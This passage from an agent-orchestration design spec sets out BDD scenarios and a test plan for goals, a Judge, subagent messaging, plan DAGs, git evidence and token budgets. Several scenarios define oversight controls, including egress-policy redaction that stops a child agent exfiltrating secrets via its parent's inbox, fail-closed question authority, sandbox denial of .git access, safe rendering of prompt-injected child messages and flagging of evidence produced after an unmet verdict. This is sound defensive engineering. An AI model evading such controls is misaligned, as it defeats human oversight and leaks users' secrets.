`run | status | inbox | inbox_ack | steer | respond | cancel | follow_up | peek` + child `message_parent`. **`peek` is an AGENT-callable, read-only action** (m8): a parent inspects its child's latest checkpoint/progress WITHOUT steering, without consuming the child's unacked ceiling, and without enqueuing anything on the child's steering queue. It is distinct from the human-facing FE-5 Agent-View panel (`ActivityPanel → Agent-View session list`), which is a separate render surface, not this tool action — the two must not be conflated. ~~Two launch profiles with a published legality table: **`utility`** (visibility=outcome, steering=none, child_messaging=progress_only — fire-and-collect, maps today's one-shot) · **`specialist`** (visibility=checkpoints, steering=parent_and_human, child_messaging=full — collaborating native worker; a 3P child degrades to fire-and-collect). Illegal combos (e.g. steering implies respond but child_messaging forbids question; visibility=outcome with child_messaging=full) are **rejected at `delegate.run`**, not silently accepted.~~ **REMOVED — superseded by ADR-053 Amendment (2026-08-30): `launch_profile` deleted outright; every direct delegation now behaves the way `specialist` used to, `action="respond"` is always available on a non-terminal child session, and there is no legality table or illegal combo to reject.** Each new action/tool: contract-first schema → seeded Constraint-#6 policy entry (explicit, no wildcard) → handler → anti-pattern tests → a BOM row.

### Schema provenance summary (EXTEND vs NEW — DoD-11)

| Schema | Status |
|--------|--------|
| `AcceptanceCriterion`, `Plan`, `PlanCreateRequest`, `PlanUpdateRequest`, `Task`, `JudgeVerdict`, `CriterionVerdict`, `GoalStatusFrame`, `Session`, `SessionDetail`, `SubagentStartFrame`, `SubagentEndFrame` | **EXTEND** (never duplicate) |
| `SessionMessage`, Durable session-lifecycle record (8-state), Revision entry, Unified goal wrapper, `write_sets`/`rationale` fields, `TokenBudgetStatus`, Pill-state enum values, Cancel/Restart request-response, delegate action set + `message_parent` | **NEW** |

---

## BDD Scenarios

> Every scenario carries `Traces to:` (User Story + Acceptance Scenario) and a Category. Conformance scenarios (Group Z) realize each §9.1 diagram — the assertion is that the drawn path is the observed path.

### Feature: Claim-or-idle trigger & pause

#### Scenario: Completion claim invokes the Judge exactly once (G-1)
**Traces to**: US-1, AS-1
**Category**: Happy Path
- **Given** an active chat goal and a worker turn ending with `[goal:evidence]` and `GOAL_STATUS: met`
- **When** the turn completes
- **Then** the Judge is invoked exactly once
- **And** a met verdict transitions the goal to `done`; an unmet verdict consumes one round and injects a steer

#### Scenario: Idle settlement fires one adjudication and re-arms only on new activity (G-2)
**Traces to**: US-1, AS-2
**Category**: Happy Path
- **Given** an active goal with no pending turn, no running sub-tasks/subagents/shells, not waiting-on-user, rounds remaining
- **When** the ~60 s quiet window elapses
- **Then** exactly one adjudication fires and consumes one round
- **And** the timer re-arms only on new activity (an unmet verdict's steer re-dispatch IS new activity)

#### Scenario: Claimless idle judging reads persisted evidence (G-3)
**Traces to**: US-1, AS-3 / US-12, AS-3
**Category**: Alternate Path
- **Given** a never-claiming worker at idle settlement
- **When** the Judge runs
- **Then** it bypasses the rung-0 gate and judges persisted evidence (artifacts, write-set-scoped diffs, latest checkpoint)

#### Scenario Outline: Bounce economics — first bare claim free, second costs (G-4)
**Traces to**: US-1, AS-1
**Category**: Edge Case
- **Given** an active goal
- **When** a worker emits `<claim>` without an evidence line `<n>` time(s)
- **Then** the outcome is `<result>`

**Examples**:
| claim | n | result |
|-------|---|--------|
| `GOAL_STATUS: met` (no `[goal:evidence]`) | first | bounced before the Judge with a teaching steer; no round spent |
| `GOAL_STATUS: met` (no `[goal:evidence]`) | second | consumes an attempt/round |

#### Scenario: Waiting-on-user typed pause consumes no round (G-5)
**Traces to**: US-2, AS-1
**Category**: Happy Path
- **Given** an active goal
- **When** a worker turn ends with `GOAL_STATUS: waiting_on_user`
- **Then** the goal pauses with no verdict and no round
- **And** idle settlement is suppressed while waiting

#### Scenario: No marker means not-waiting (deterministic fallback)
**Traces to**: US-2, AS-2
**Category**: Edge Case
- **Given** a worker turn with no `GOAL_STATUS` marker
- **When** the turn ends
- **Then** the goal is treated as not-waiting (no prose classifier is consulted)

#### Scenario: Stray claim after /goal clear is inert (N-12)
**Traces to**: US-3, AS-5
**Category**: Edge Case
- **Given** a goal that was just cleared with `/goal clear`
- **When** a later worker turn emits `GOAL_STATUS: met`
- **Then** no adjudication fires (claim is gated on an active goal)

#### Scenario: Verifier turn counts as activity — no self-race (architect F5)
**Traces to**: US-1, AS-2
**Category**: Edge Case
- **Given** an in-flight verifier adjudication
- **When** the idle timer would otherwise fire
- **Then** the verifier's own turn re-arms the timer so no second idle verdict races the running adjudication

#### Scenario: Compile-gate false-accept resolves unmet and escalates once (R§8.1)
**Traces to**: US-3, AS-6
**Category**: Error Path
- **Given** a criterion the compile gate accepted whose verifier turn RAN to completion but could form no judgment (genuinely subjective)
- **When** it is adjudicated
- **Then** `classifyNonVerdict` returns `criterion_unjudgeable`, the criterion resolves `unmet` (AND-combine keeps the goal unmet, bounded by rounds)
- **And** exactly one `criterion_unjudgeable` owner-escalation is emitted per goal-id
- **But** no runtime `criterion_unverifiable` verdict class is created and the criterion is not mutated

#### Scenario Outline: Non-verdict classifier keys on whether the mechanism ran (M1)
**Traces to**: US-3, AS-6 / US-12, AS-1
**Category**: Error Path
- **Given** a verifier adjudication of one criterion where `<situation>`
- **When** `classifyNonVerdict(verifierTurn)` runs (predicate = "did the verification mechanism run to completion?")
- **Then** the classification is `<class>` and the disposition is `<disposition>`

**Examples**:
| situation | class | disposition |
|-----------|-------|-------------|
| the check's tool was sandbox-denied / unavailable / policy-blocked | `unable_to_verify` | re-run, NEVER scored (G-3 blocked-check honesty) |
| the check ran but its exit code was unreadable | `unable_to_verify` | re-run, never scored |
| the SAME check returns unable-to-verify `K` (`unable_to_verify_max_reruns`, default 3) consecutive times | `unable_to_verify` (bounded) | escalate to owner as a persistently-blocked check — the re-run loop is bounded, never infinite (m-4) |
| the verifier turn RAN to completion but formed no judgment (subjective prose) | `criterion_unjudgeable` | unmet + escalate-once (§8.1) |

#### Scenario: Owner remediates a criterion_unjudgeable by re-statement, else honest failure (M2)
**Traces to**: US-3, AS-6/AS-7
**Category**: Error Path
- **Given** a `criterion_unjudgeable` owner-escalation was surfaced for a goal-id
- **When** the owner re-states the goal
- **Then** the re-statement is diffed and confirmed as an amendment (D11/N-6) minting a new goal generation with the mis-compiled criterion corrected — never a silent recompile
- **But** if the owner instead does nothing, the goal keeps consuming rounds on the unmet verdict and honestly terminates `failed(judge_rounds_exhausted)` (escalate-once surfaces the problem; it does NOT halt round consumption)

#### Scenario: Blocked machine check returns unable-to-verify, never absent evidence (G-3)
**Traces to**: US-12, AS-1
**Category**: Error Path
- **Given** a machine check the sandbox denied
- **When** the Judge evaluates the criterion
- **Then** it returns "unable to verify" and the check is re-run safely
- **But** it is never scored as absent evidence

#### Scenario: Round means one adjudication after upgrade (R§8.9)
**Traces to**: US-1, AS-5
**Category**: Edge Case
- **Given** an in-flight goal whose stored round count was accrued under "one turn + judge"
- **When** the system upgrades to adjudication-based counting
- **Then** the stored integer is preserved unchanged
- **And** future increments occur per adjudication (claim or idle), and `GoalStatusFrame.round` is described as adjudications

### Feature: Multi-goal cardinality

#### Scenario: Two goals in one session run independently (R§8.11)
**Traces to**: US-1, AS-4
**Category**: Edge Case
- **Given** a session carrying two active goals
- **When** each reaches idle settlement independently
- **Then** two pills, two idle timers and two round budgets exist, keyed by goal-id
- **And** each active goal consumes one global-cap slot; delegate children consume none

### Feature: Goal compiler & feasibility gate

#### Scenario: Feasibility gate rejects an out-of-policy criterion (G-7)
**Traces to**: US-3, AS-1
**Category**: Error Path
- **Given** a compiled criterion referencing a tool or credential outside the agent's policy
- **When** `/goal set` runs
- **Then** the feasibility gate rejects it at compile and no criterion persists

#### Scenario: Semantic non-judgeability rejected at compile (D9)
**Traces to**: US-3, AS-2
**Category**: Error Path
- **Given** a compiled criterion with no determinable truth ("the refactor feels maintainable")
- **When** compiled
- **Then** it is rejected for semantic non-judgeability at compile time

#### Scenario: Echo-confirm activates only on chat reply (G-8)
**Traces to**: US-3, AS-3
**Category**: Happy Path
- **Given** a compiled goal including literal commands
- **When** the agent echoes it in chat and the user replies to confirm
- **Then** the goal goes active only on that reply (no form/modal)

#### Scenario: Re-statement is a diffed amendment, not a silent recompile (N-6)
**Traces to**: US-3, AS-4
**Category**: Alternate Path
- **Given** an active goal
- **When** the user issues `/goal <new intent>`
- **Then** it is diffed against the current goal and surfaced as an amendment (added/changed/dropped) to confirm — never silently recompiled

### Feature: Durable session record & boot sweep

#### Scenario: Boot sweep reconciles non-terminal sessions (G-13)
**Traces to**: US-5, AS-1
**Category**: Error Path
- **Given** a mid-plan `kill -9`
- **When** the gateway restarts
- **Then** each persisted `running`/`paused` session becomes `failed(interrupted)` within N s carrying its last checkpoint + undelivered messages
- **And** a `session.failed` event is emitted, the plan re-judges/re-dispatches, and idle settlement fires — no session remains `running` with no live turn

#### Scenario Outline: needs_input reconstructability predicate (R§8.6)
**Traces to**: US-5, AS-2
**Category**: Edge Case
- **Given** a parked `needs_input` session where `<condition>`
- **When** the boot sweep evaluates `isNeedsInputReconstructable`
- **Then** the outcome is `<outcome>`

**Examples**:
| condition | outcome |
|-----------|---------|
| checkpoint present, agent resolves, correlation live, snapshot within cap | preserved as resumable |
| agent deleted | swept to `failed(interrupted)` |
| no checkpoint at park | swept to `failed(interrupted)` |
| snapshot exceeds `snapshot_max_bytes` | swept to `failed(interrupted)` |

#### Scenario: Live-upgrade re-baseline (N-15)
**Traces to**: US-5, AS-3
**Category**: Edge Case
- **Given** an in-flight goal predating a trigger-semantics upgrade
- **When** the boot sweep runs on the new install
- **Then** the goal is quiesced and re-baselined (idle timers re-armed, trigger config re-read) so it does not straddle two semantics

#### Scenario: Awaiting-owner-correction survives restart without a re-judge (C1)
**Traces to**: US-5, AS-4 / US-16, AS-3
**Category**: Error Path
- **Given** a plan durably in `plan_phase=awaiting_owner_correction` (its owner session `paused`, `last_unmet_terminal_signature` persisted) when the gateway is `kill -9`ed
- **When** the gateway restarts and the boot sweep runs
- **Then** the paused plan-owner session is EXEMPT from the `failed(interrupted)` sweep (it is legitimately idle awaiting the owner)
- **And** the persisted `last_unmet_terminal_signature` survives, so the engine does NOT re-judge the unchanged all-terminal state — zero JudgeRounds are burned by the restart (closes the standalone-F2 in-memory restart gap)
- **But** the plan still recovers into the owner-correction loop the moment the owner appends a correction (G-13 recovery and G-9 no-re-judge both hold)

### Feature: Session messaging & delegation

#### Scenario: Native child pushes typed messages to the parent inbox (g6)
**Traces to**: US-6, AS-1
**Category**: Happy Path
- **Given** a native child on the specialist profile
- **When** it calls `message_parent(progress|checkpoint|artifact|blocker|question|handback)`
- **Then** each lands typed in the parent inbox, deduped by `message_id`, wrapped in untrusted-origin framing

#### Scenario: Illegal launch-flag combo rejected at delegate.run (MAJ-7)
**Traces to**: US-6, AS-2
**Category**: Error Path
- **Given** a `delegate.run` with visibility=outcome and child_messaging=full
- **When** dispatched
- **Then** it is rejected with a clear tool error, not silently accepted

#### Scenario: Curated context snapshot is deny-by-default and hard-capped (R§8.5)
**Traces to**: US-6, AS-4
**Category**: Edge Case
- **Given** a `delegate.run` whose DISCRETIONARY snapshot portion (parent-named references + notes) exceeds `snapshot_max_bytes` or whose reference count exceeds `snapshot_max_refs`
- **When** dispatched
- **Then** it is rejected with a narrow-the-snapshot error
- **And** a within-cap snapshot carries only the task prompt, goal/criteria, parent-named artifact references, and engine-injected child identity — never parent transcript, credentials, or sibling context
- **But** a large-but-legitimate goal whose MANDATORY core (task prompt + compiled criteria + engine-injected identity) alone exceeds `snapshot_max_bytes` is NOT rejected — the mandatory core is exempt from the byte cap; only the discretionary portion counts (m4)

#### Scenario: Per-child unacked ceiling fails back, sibling unaffected (D15)
**Traces to**: US-6, AS-3
**Category**: Edge Case
- **Given** a child at its 20-open-question+blocker per-child ceiling
- **When** it sends another question
- **Then** the send fails back to the child as a tool error ("await answers")
- **And** a sibling child under the same parent is unaffected

#### Scenario: needs_input escalates then auto-handback at TTL (G-6)
**Traces to**: US-6, AS-5
**Category**: Error Path
- **Given** a native child parked in `needs_input`
- **When** T1 elapses then the 24 h TTL elapses (fake clock)
- **Then** the owner (and human where permitted) is notified at T1 and an auto-`handback(mode=pause)` fires at TTL — never a silent expiry

#### Scenario: Warm resume keeps context; respond routes by correlation_id (g7)
**Traces to**: US-6, AS-1 / US-7, AS-2
**Category**: Happy Path
- **Given** a native child parked on a blocking `question(wait=true)`
- **When** the parent sends `respond` by `correlation_id` and a `steer`
- **Then** both land at the child's next tool boundary, the child keeps warm context (no cold restart), and a clean `handback` feeds the rung-0 evidence gate

#### Scenario: Cross-boundary message obeys the same content-egress policy (FR-128, N-10)
**Traces to**: US-6, AS-1
**Category**: Error Path
- **Given** a child whose direct outputs would be blocked/redacted by the agent's content-egress policy (e.g. a secret, or an out-of-policy destination)
- **When** the child tries to convey that same content to its parent through the inbox (`message_parent`)
- **Then** the message crosses the agent/channel boundary under the SAME content-egress policy the agent's outputs obey — the secret is redacted (S-2) and the child cannot exfiltrate through the parent's inbox what it could not send directly
- **And** the surviving body renders to the parent LLM in untrusted-content framing

#### Scenario: Sync-delegate wait=true question is rejected by default (FR-130, MIN-3)
**Traces to**: US-6, AS-2
**Category**: Error Path
- **Given** a synchronous `delegate.run` (`wait=true`) whose child raises a `question`
- **When** the question would block the synchronous caller
- **Then** it is rejected with a clear tool error by default (never a silent deadlock)
- **But** human routing is available only via an explicit launch-flag opt-in with a bounded wait

### Feature: Parent-routed questions & authority

#### Scenario: owner_required question cannot be answered by the parent (R§8.2)
**Traces to**: US-7, AS-1
**Category**: Error Path
- **Given** a child question tagged `authority: owner_required`
- **When** the parent attempts `respond` directly
- **Then** the runtime validator rejects it and the question forwards to the owner terminus (human/top-level)

#### Scenario: self_ok question answered by the parent (D2)
**Traces to**: US-7, AS-2
**Category**: Happy Path
- **Given** a child question tagged `authority: self_ok`
- **When** the parent answers
- **Then** `respond` is accepted and routed by `correlation_id`; out-of-order answers are safe

#### Scenario Outline: Runtime derives authority fail-closed; a child cannot downgrade (M3)
**Traces to**: US-7, AS-1
**Category**: Error Path
- **Given** a child `question` whose child-authored tag is `<child_tag>` and whose content `<content>`
- **When** `deriveQuestionAuthority(q)` runs before the parent may answer
- **Then** the effective authority is `<effective>` and a parent `respond` is `<respond_disposition>`

**Examples**:
| child_tag | content | effective | respond_disposition |
|-----------|---------|-----------|---------------------|
| (omitted) | any | `owner_required` | rejected — escalates to owner (fail-closed default) |
| `self_ok` | references a credential/secret | `owner_required` (runtime UPGRADE) | rejected — escalates to owner |
| `self_ok` | requests a spend/budget action | `owner_required` (runtime UPGRADE) | rejected — escalates to owner |
| `self_ok` | invokes an irreversible tool | `owner_required` (runtime UPGRADE) | rejected — escalates to owner |
| `self_ok` | is out-of-goal-scope | `owner_required` (runtime UPGRADE) | rejected — escalates to owner |
| `self_ok` | in-scope, no credential/spend/irreversible reference | `self_ok` | accepted — parent may answer |
| `owner_required` | any | `owner_required` (child cannot downgrade) | rejected — escalates to owner |

#### Scenario: Human answers in normal chat, no reply card (D2)
**Traces to**: US-7, AS-3
**Category**: Happy Path
- **Given** a top-level chat-goal session with an open question
- **When** the human replies in normal chat
- **Then** correlation routing is the parent's job and no separate approval/correlation UX renders

#### Scenario: Deep-chain direct-escalate is opt-in and latency-bounded (R§8.7)
**Traces to**: US-7, AS-4
**Category**: Alternate Path
- **Given** a parent that opted into direct-escalate for `owner_required` questions
- **When** a grandchild raises an `owner_required` question
- **Then** the engine routes it to the nearest human owner in one traversal within `question_escalation_max_hops`/`_deadline`, notifying intermediate parents
- **But** with no opt-in the default is strict one-hop (each parent forwards manually)

### Feature: 3P fire-and-collect

#### Scenario: 3P child emits only fire-and-collect markers (D5)
**Traces to**: US-8, AS-1
**Category**: Happy Path
- **Given** a `subagent_3p` child
- **When** it runs
- **Then** it emits only progress/artifact/handback markers and the terminal claim line — no question/needs_input

#### Scenario: respond to a 3P child spawns a new corrective session (D5)
**Traces to**: US-8, AS-2
**Category**: Alternate Path
- **Given** a parent responding to a 3P child
- **When** `respond` is issued
- **Then** a new corrective 3P session is spawned carrying the prior context — never a warm resume

### Feature: Owner loop & correction

#### Scenario: Awaiting-owner-correction burns one round then waits (G-9, F2)
**Traces to**: US-9, AS-1 / US-17, AS-1
**Category**: Error Path
- **Given** an all-terminal-but-unmet plan
- **When** the idle engine ticks N times on unchanged state
- **Then** exactly one JudgeRound is consumed and the plan holds in `awaiting-owner-correction`
- **But** no verdict is recomputed against unchanged state

#### Scenario: Auto-reset excludes frozen members; unreachable DoD → honest exit (G-10)
**Traces to**: US-9, AS-2
**Category**: Edge Case
- **Given** an unmet DoD with a frozen member and live-round failed members
- **When** auto-reset runs
- **Then** it resets only live-round failed members, excludes frozen ones, tails depend only on `done` outcomes, and an unreachable DoD takes the honest-exit path (no livelock)

#### Scenario: Correction is transactional with three verbs (G-11)
**Traces to**: US-9, AS-3 / US-16, AS-2
**Category**: Edge Case
- **Given** a plan owner correcting an unmet DoD
- **When** it appends a tail / SUPERSEDEs a done member / TARGETED-RETRYs a frozen-transient member
- **Then** each records a revision entry; the append is transactional (kill mid-append → pre-append DAG); the DoD stays immutable and a superseded member's record stays immutable (only Judge weighting changes)

#### Scenario: Play resumes from last git commit as a new generation (G-12, D13)
**Traces to**: US-9, AS-4
**Category**: Alternate Path
- **Given** a Stopped plan with done and failed members
- **When** Play is pressed
- **Then** a `resumed_from` generation is minted via cancelled→approved, done members preserved, failed/cancelled resume from the last git commit (no-commit → fresh attempt), JudgeRounds 0

#### Scenario: Plan members have no per-member controls (D7)
**Traces to**: US-9, AS-5 / US-14, AS-4
**Category**: Edge Case
- **Given** a running plan
- **When** its members are viewed
- **Then** members show status only — no per-member ▶/■/Play; only standalone tasks carry controls

#### Scenario: Planner/re-planner behavior extends the embedded plan skill, not a new agent (FR-146, N-2)
**Traces to**: US-9, AS-3
**Category**: Alternate Path
- **Given** a plan owner about to plan or re-plan
- **When** the planning/re-planning behavior is invoked
- **Then** it is delivered by the §3b/§3c checklists EXTENDED into `pkg/skills/embedded/plan/SKILL.md` — never a forked Planner agent (BOM)
- **And** the owner's gaming-guard holds: the ladder weights deterministic rungs, and any artifact produced post-unmet is flagged post-hoc (N-2)

### Feature: Git evidence layer

#### Scenario: Write-set-scoped boundary commit; out-of-write-set change is contention (G-15)
**Traces to**: US-10, AS-1
**Category**: Edge Case
- **Given** two concurrent members sharing one `work/` checkout (subdir rung)
- **When** member A's boundary commit fires
- **Then** it adds only A's declared write-set; B's out-of-write-set half-written files surface as contention evidence to the Judge, never silently swallowed

#### Scenario: .git deny by operation + sandbox block (D17)
**Traces to**: US-10, AS-2
**Category**: Error Path
- **Given** a worker in `work/`
- **When** it runs `git log/blame/show/diff`
- **Then** each read succeeds
- **But** `git commit/amend/rebase/rm` (tool surface) and any bash access to `.git/` (sandbox block) are denied

#### Scenario: HEAD-divergence surfaces evidence integrity lost (G-15)
**Traces to**: US-10, AS-3
**Category**: Error Path
- **Given** a boundary commit whose HEAD has diverged from the engine's last-known commit
- **When** the engine checks at commit time
- **Then** it surfaces "evidence integrity lost" and the Judge fails closed on that diff channel

#### Scenario: Degraded ladder — no commit → fresh attempt, signalled (R§8.4)
**Traces to**: US-10, AS-4
**Category**: Alternate Path
- **Given** a runtime with no boundary commit (size-guard skip / nested-repo / subdir-only)
- **When** Play resumes a member
- **Then** it falls back to a fresh attempt and the Judge is told "rung-1 diffs unavailable"

#### Scenario: Secret written then deleted is caught on auto-commit (MIN-5)
**Traces to**: US-10, AS-5
**Category**: Error Path
- **Given** an auto-commit path
- **When** a worker writes then deletes a secret
- **Then** the sensitive-value registry scan catches it and the documented purge/gc applies

### Feature: Plan-lint & isolation ladder

#### Scenario: Overlapping parallel write-sets rejected at approve (G-16)
**Traces to**: US-11, AS-1
**Category**: Error Path
- **Given** a plan with two parallel streams declaring overlapping write paths
- **When** approve runs
- **Then** plan-lint rejects the plan naming the overlap

#### Scenario: Join-less convergence rejected (G-16)
**Traces to**: US-11, AS-2
**Category**: Error Path
- **Given** parallel streams that converge with no authored merge/assemble member
- **When** approve runs
- **Then** plan-lint rejects the plan

#### Scenario: Exploratory member runs in its own isolated checkout; merge conflict → correction event (D10)
**Traces to**: US-11, AS-3
**Category**: Alternate Path
- **Given** an exploratory member declaring no write-set
- **When** it runs and a genuine same-file conflict arises at the join
- **Then** it runs in its own isolated checkout — the HIGHEST available isolation rung the runtime supports (system-git worktree → go-git clone → subdir per FR-154; never assuming go-git `worktree add`, which does not exist — ADR §6.1 caveat 2) — and the conflict surfaces as a plan-correction event, never silently resolved

#### Scenario: Shard+assemble builds the artifact at an authored join (g5)
**Traces to**: US-11, AS-4
**Category**: Alternate Path
- **Given** a report-with-workbook plan
- **When** three disjoint-shard streams run and ONE assemble member builds the `.xlsx`
- **Then** the assemble member is a first-class member with its own criteria and the Judge verifies the merged result

### Feature: Token budget

#### Scenario: Overall budget debits every scope including core agents (G-14)
**Traces to**: US-13, AS-1
**Category**: Happy Path
- **Given** a set overall token budget
- **When** owner/member/verifier/Judge turns run (including a core-agent turn)
- **Then** each debits provider usage regardless of `IsPrivilegedAgent`, and concurrent debits are atomic (one pool, one lock)

#### Scenario: Exhaustion brakes with graceful wind-down (R§8.3c)
**Traces to**: US-13, AS-2
**Category**: Error Path
- **Given** the overall pool crossing zero
- **When** the current turn finishes
- **Then** the scope transitions to `failed(budget_exhausted)` at the next boundary with a handover summary
- **But** no new turn/dispatch/adjudication starts once exhausted (no mid-turn hard-fail)

#### Scenario: Unset budget runs unbounded with advisory (R§8.3a)
**Traces to**: US-13, AS-3
**Category**: Edge Case
- **Given** a fresh install with `token_budget` unset (`0`)
- **When** goals run
- **Then** they run unbounded and the Usage screen shows a persistent "unbounded — set a budget" advisory

#### Scenario: Token≠dollar warning at set-time (R§8.3b)
**Traces to**: US-13, AS-4
**Category**: Edge Case
- **Given** the operator setting a token budget
- **When** they save it
- **Then** a warning is surfaced that a token cap does not bound dollar spend uniformly across providers

#### Scenario: Attempts and JudgeRounds are two distinct brakes (FR-178)
**Traces to**: US-13, AS-1
**Category**: Edge Case
- **Given** a scope with `attempts_max` (per member/task, 3 native · 6) and `judge_rounds_max` (per goal/plan) as two separate counters
- **When** either counter trips first
- **Then** it stops its own scope locally — the two are never conflated into one number, and whichever trips first is the brake that fires

### Feature: S4 interlock invariants

#### Scenario: Concurrent steer and verdict are serialized (INV-3)
**Traces to**: US-16, AS-1
**Category**: Edge Case
- **Given** a verdict landing while a `steer` is concurrently enqueued
- **When** both fire
- **Then** the interlock serializes them — the steer applies at the next tool boundary and never interleaves with the in-flight verdict write

#### Scenario: Crash mid tail-append rolls back to pre-append DAG (INV-6)
**Traces to**: US-16, AS-2
**Category**: Error Path
- **Given** a tail append via the write-ahead intent-log — a SELF-CONTAINED intent record (full member bodies + edges + revision entry + plan-record patch) marked committed BEFORE any per-file write is applied
- **When** the engine crashes BEFORE the commit-marker (intent uncommitted, no member files applied)
- **Then** on restart boot discards the uncommitted intent, so the DAG is the exact pre-append shape — no half-wired plan is dispatched into
- **And** a crash AFTER the commit-marker but before `done` is replayed FORWARD idempotently (the done-marker makes re-applying an already-written member a no-op) to the intended post-append DAG (all-or-nothing on per-file JSONL storage, M4)

#### Scenario: Boot sweep does not re-arm a spurious re-judge (INV-7)
**Traces to**: US-16, AS-3
**Category**: Edge Case
- **Given** a plan in `awaiting-owner-correction`
- **When** the boot sweep reconciles at restart
- **Then** it does not recompute a verdict against unchanged all-terminal state (preserves `lastUnmetTerminalSignature` semantics)

### Feature: Frontend surfaces & crosswalk

#### Scenario: Pill state derives from lifecycle + engine phase overlay + durable plan_phase (R§8.10)
**Traces to**: US-14, AS-1
**Category**: Happy Path
- **Given** a goal/plan transitioning `running → judging → re-planning → done`
- **When** the pill renders
- **Then** `active` comes from lifecycle `running`, `judging` from the ephemeral engine phase signal, `re-planning` from the durable persisted `plan_phase=awaiting_owner_correction` over a `paused` session, `done` from lifecycle `completed` — reconstructable from the since-cursor replay
- **And** after a `kill -9` while `re-planning`, the pill reconstructs as `re-planning` (from the persisted `plan_phase`), NOT `waiting_on_user` — the durable source survives restart (C1)

#### Scenario: Untrusted child text renders safely (FE-7, MAJ-12)
**Traces to**: US-14, AS-3
**Category**: Error Path
- **Given** a prompt-injected child message body with raw HTML and a clickable link
- **When** rendered to a human
- **Then** it renders as plain text / sanctioned markdown, no raw HTML, links non-clickable, untrusted-origin chrome visible

#### Scenario: Mid-span frames reconstruct pill/panel on reconnect (FR-188)
**Traces to**: US-14, AS-1
**Category**: Alternate Path
- **Given** a subagent span that emitted mid-span `subagent_message`/`subagent_state` frames (state, checkpoint, message, steering-receipt) between its Start and End brackets
- **When** a SPA reconnects and replays the since-cursor WS stream
- **Then** it reconstructs the pill/panel/board state from those frames — no parallel ad-hoc channel is used, the frames ride the existing `SubagentStartFrame`/`SubagentEndFrame` replay

### Feature: Operability

#### Scenario: Global kill switch neuters messaging live (DoD-10)
**Traces to**: US-15, AS-1
**Category**: Alternate Path
- **Given** a running system
- **When** `session_messaging.enabled` is set to false
- **Then** all messaging is neutered without a rebuild (live reload)

#### Scenario: Retention horizons are all named (MIN-8)
**Traces to**: US-15, AS-3
**Category**: Edge Case
- **Given** the config
- **When** retention is inspected
- **Then** message store inherits 90-day session retention, audit inherits the audit-subsystem policy, and the 7-day undelivered window is a separate horizon

### Group Z — Design-conformance scenarios (§9.1: the drawn path is the observed path)

#### Scenario: t0 · chat goal end-to-end walks the drawn path
**Traces to**: US-1/US-2/US-3, all AS
**Category**: Happy Path
- **Given** a fresh install
- **When** `/goal` set → SMART compile → conversational confirm in chat → worker turn → claim OR idle trigger (assert which) → Judge verdict → done
- **Then** non-claim question-turns pause without a verdict/round, the pill walks active→judging→done, and `/goal clear` cancels the verifier AND any in-flight compilation

#### Scenario: t1 · standalone task walks the drawn path
**Traces to**: US-4, AS-1
**Category**: Happy Path
- **Given** a standalone task
- **When** ▶ Run → claim → evidence-gate (bare claim → free steer, 2nd → attempt) → ladder → done
- **Then** ■ Stop cancels the turn + verifier

#### Scenario: t2 · plan lifecycle walks the drawn path
**Traces to**: US-9, AS-1/AS-4/AS-5
**Category**: Happy Path
- **Given** a plan
- **When** Execute → gated approve → members dispatch per DAG → all-terminal → plan Judge → unmet → awaiting-owner-correction holds (no round burned on unchanged state — F2 proof) → owner appends → re-judge → done
- **Then** Play resumes a cancelled member from the last git commit and no per-member start/cancel/resume exists

#### Scenario: t3 · planning & re-planning walks the drawn path
**Traces to**: US-9, AS-3
**Category**: Happy Path
- **Given** intent + reference docs
- **When** owner plans (checklist) → execute → unmet-all-done → owner re-plans → SUPERSEDE a done member and TARGETED-RETRY a frozen-transient member → transactional append (kill mid-append → pre-append DAG) → done
- **Then** each correction records a revision entry and the DoD stays immutable

#### Scenario: g4 · parallel streams lint walks the drawn path
**Traces to**: US-11, AS-1/AS-3
**Category**: Alternate Path
- **Given** parallel streams
- **When** disjoint write-sets → lint passes; overlapping → lint rejects at approve; an exploratory member → own isolated checkout (highest available rung: worktree → clone → subdir)
- **Then** a merge at the join surfaces a real conflict as a plan-correction event

#### Scenario: g5 · worked topologies (shard+assemble + software worktrees)
**Traces to**: US-11, AS-4
**Category**: Alternate Path
- **Given** one git-based model
- **When** (a) a software plan runs a serial contract-first member → two lint-disjoint isolated-checkout streams (highest available rung per FR-154) → a merge member leaving one green tree; and (b) a report-with-workbook runs a serial shard-schema member → three disjoint-shard streams → ONE assemble member building the `.xlsx`
- **Then** the join is a first-class member with its own criteria in both, and the isolation rung matches runtime capability (worktree → clone → subdir)

#### Scenario: g6 · session control walks the drawn path
**Traces to**: US-6/US-7/US-8, all AS
**Category**: Happy Path
- **Given** a spawned child (isolated-but-linked, own SessionID, context snapshot)
- **When** the child `message_parent(question)` → parent answers or escalates to human in chat → `respond`/`steer` lands at the child's next tool boundary → `handback`
- **Then** a 3P child is fire-and-collect (respond = new corrective session), the per-child ceiling holds (one noisy child cannot starve a sibling), and the durable inbox survives a parent Stop/Play

#### Scenario: g7 · session round-trip sequence walks the drawn path
**Traces to**: US-6, AS-1 / US-7, AS-2
**Category**: Happy Path
- **Given** a warm native child
- **When** a mid-run `steer` + a blocking `question(wait=true)` answered by `respond` without restarting the child + a clean `handback` into the evidence gate
- **Then** the child kept warm context (no cold restart), the answer routed by `correlation_id`, and the handback's `result_so_far/artifacts[]/open_questions[]` fed the rung-0 gate

#### Scenario: §5 boot sweep walks the drawn path
**Traces to**: US-5, AS-1/AS-3
**Category**: Error Path
- **Given** a `kill -9` mid-plan
- **When** non-terminal sessions → `failed(interrupted)` within N s → plan re-judges/re-dispatches → idle settlement fires again
- **Then** no wedge occurs (CRIT-1 proof) and an in-flight goal predating an upgrade is re-baselined (N-15)

---

## Test-Driven Development Plan

### Test Hierarchy

| Level | Scope | Purpose |
|-------|-------|---------|
| Unit | criteria compile/gate, marker parser, budget debit, plan-lint, crosswalk, reconstructability predicate, authority validator | Validate logic in isolation with fake clocks/stubs |
| Integration | trigger loop, owner-correction loop, session-message transport + caps, boot sweep, git boundary commits, S4 interlock invariants | Validate components work together on the REAL substrate (no stubs) |
| E2E | the 9 §9.1 conformance flows + the live goal-loop shard on a fresh install | Validate the drawn path is the observed path, at least one real-LLM run per user-facing flow |

### Test Implementation Order (write BEFORE implementation; Unit → Integration → E2E, dependency-ordered)

| Order | Test Name | Level | Traces to BDD Scenario | Description |
|-------|-----------|-------|------------------------|-------------|
| 1 | `TestGoalStatusMarkerParser_Family` | Unit | No marker means not-waiting / Waiting-on-user pause | `GOAL_STATUS: met/waiting_on_user` parse co-located with teaching fragment |
| 2 | `TestEvidenceGate_ConsecutiveRejectionsRouteThroughAttemptBudgetOnSecond` | Unit | Bounce economics (G-4) | 1st bare claim free, 2nd costs |
